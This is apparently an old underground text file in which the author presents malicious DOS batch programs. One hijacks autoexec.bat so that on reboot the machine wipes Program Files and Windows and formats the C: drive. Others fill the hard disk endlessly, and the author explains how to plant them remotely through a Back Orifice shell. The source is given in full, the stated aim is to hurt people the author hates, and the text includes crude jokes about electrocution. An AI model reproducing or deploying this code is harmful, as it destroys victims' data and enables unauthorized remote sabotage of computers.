This version doesn't\ntake the time to cipher and then delete files, it simply deletes every\nthing on your hard drive, a good point is that it doesn't need any\nother programs (the last version did, remember) and it can be used if\nyou just send it to somebody.\n\nA basic run down of this program is as follows:\n1) It writes to the autoexec.bat awaiting the computer to reboot.\n2) the computer reboots and all of the c:\\progra~1 directory get's\n   deleted\n3) A few files get copied from the c:\\windows\\command directory\n4) c:\\windows get's deleted, as do all the subdirectories (isn't\n   deltree great fun)\n5) The hard drive get's formatted (unconditionaly; of course).\n\nSimple isn't it, like i said, it only takes two minutes, hmm hang on,\nit takes less than that because i removed the ability to fill the\nhard drive before deleting everything (copied c:\\windows into one big\nhuge file, then duplicated it several times before the drive was\nformatted.\n\nSome of you will think that programs like this are lame, but i don't\ngive a shit, there's people out there that i hate with a passion, and\nwhat better way to digitally say \"FUCK YOU\" than to format there hard\ndrive, hmm thinking about that last statement i think that ramming\nthere head into the monitor and turning on the power might be a\nslightly better way to deal with them, but that would defeat the whole\nobject of deleting there hard drive, perhaps ramming there head into\nthe montor after they've reinstalled everything?. I'm rambling on here,\ni'll shut up about electrocuting people now.\n\nI mean this batch file has the same usage as the previous version,\nthis one is also easier to use since it doesn't need to be \"primed\"\nby running it on the target computer in the c:\\ directory.\n\nAnyway here's the source code for my loverly creation:\n\n--cut SHDC.BAT--\n\n@ echo off\nrem OHHHH YEEEEEEEEEEAAAAAAAAAAAAAAAAAAAAHHHHHHHH The second version\nrem of this program is ready, more powerful than the first version, and\nrem overall, a far superiour annihilation tool. All bow down to the:\nrem SWATeam Hard Drive Cleaner! Guaranteed to give somebody a bad day.\n\ncls\ncall attrib -h -r c:\\autoexec.bat >nul\necho @echo off >c:\\autoexec.bat\necho deltree /y c:\\progra~1\\*.* >nul >>c:\\autoexec.bat\necho copy c:\\windows\\command\\format.com c:\\ >nul >>c:\\autoexec.bat\necho copy c:\\windows\\command\\deltree.exe c:\\ >nul >>c:\\autoexec.bat\necho deltree /y c:\\windows\\*.* >nul >>c:\\autoexec.bat\necho format c: /q /u /autotest >nul >>c:\\autoexec.bat\n\nRem That little piece of code will ensure that the hard drive get's\nrem pretty much scrubbed. In my tests it took only 2 minutes to wipe\nrem a hard drive of a few hundred megs of data.\nrem So maybe it isn't as big as the firist version, but atleast it\nrem doesn't use any other programs as it copies the required files\nrem from the hard drive. Yes so it is very simple, it only took me\nrem five minutes to write, when i can be bothered i'll write a more\nrem efficent hard drive annihilator. You'll probably be able to get\nrem hold of it via http://www.swateam.org\nrem Coded by -=The Firestarter=- ('cause i was board)\n\n--cut SHDC.BAT--\n\nyeah mearly by looking at the sorce code, anyone who knows anything\nabout batch files, or even MS-DOS will know exactly what happens.\n\nFiller and KILLER FILLER\n=========================\n\nWell incase some of you want to fill a hard drive without actually\nformatting it, since filling a hard drive can be just as problamatic\nfor the poor sod who's computer it is. filler and KILLER FILLER are the\nsame program, only KILLER FILLER is a lot faster than Filler.\n\nsimply run this batch file:\n\n--cut fill.bat--\n@echo off\n:fill\necho a >nul >>fill.txt\ngoto fill\n--cut fill.bat--\n\nwhat that will do is create a file that contains a list of A's, the\nfile will keep on growing until the hard drive is full or the file is\nprevented from running. Killer filler on the other hand...\n\n\n\n--cut killfill.bat--\n@echo off\n:killfill\necho LOOKS LIKE YA DRIVES FULL! >nul >>killfill.txt\n<above line repeated here, and for another 50 lines>\ngoto killfill\n--cut killfill.bat--\n\nThat would grow at a rate of about 300kb a second, or something near to\nthat anyway. The disadvantage of that version is that there will almost\ncertainly be left over space (ok so it will only be a few kb's),\nwhere as the first version will, at the most have only 1 byte left over\nfrom it. I actually tried a bigger version of this batch file, one\nthat was 1.34mb big, that was extreamly fast and didn't take long to\nfill the 270mb hard drive, a gigabyte drive on the otherhand, well that\nwould take ages. One advantage of these files is that they compress\namazingly well, so they can be transferd to computers extreamly easily.\n\nSo how long does it take to fill a hard drive? fucking ages is the\nanswer. If one the other hand your into destroying computers using\nBack Orofice, then spawning c:\\command.com on port 23, telnetting to\nit and then type this in:\n\necho @echo off >killfill.bat\necho :killfill  >>killfill.bat\necho echo LOOKS LIKE YA DRIVES FULL! >nul >>killfill.txt >>killfill.bat\necho goto killfill >>killfill.bat\n\nthen go to \"spawn program\" and spawn it as unviewable. Ok so it does\nstill take ages, you can modify it to write to the autoexec.bat file\nif you really want.\n\nAnyway have fun messing about with those programs, i might write an\narticle on batch files (on how to write them) some time in the near\nfuture."
